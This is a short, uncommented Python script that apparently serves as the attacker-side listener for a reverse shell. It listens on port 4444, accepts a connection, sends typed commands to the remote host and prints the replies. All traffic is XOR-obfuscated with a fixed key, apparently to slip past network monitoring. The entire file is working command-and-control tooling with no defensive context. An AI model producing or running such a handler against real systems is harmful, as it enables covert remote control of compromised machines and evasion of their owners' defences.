import socket
import sys
import select

XOR_KEY = b'ABCD'

def xor_crypt(data):
    return bytes([data[i] ^ XOR_KEY[i % len(XOR_KEY)] for i in range(len(data))])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 4444))
s.listen(5)
print("Listening on 0.0.0.0:4444 (XOR encrypted)...")
conn, addr = s.accept()
print(f"Connection from {addr}")

try:
    while True:
        rlist, _, _ = select.select([conn, sys.stdin], [], [])
        for ready in rlist:
            if ready == conn:
                data = conn.recv(1024)
                if not data:
                    print("Connection closed")
                    sys.exit(0)
                decrypted = xor_crypt(data)
                sys.stdout.buffer.write(decrypted)
                sys.stdout.buffer.flush()
            else:
                cmd = sys.stdin.readline()
                encrypted = xor_crypt(cmd.encode())
                conn.send(encrypted)
                
except KeyboardInterrupt:
    print("\nExiting...")
    conn.close()
    s.close()

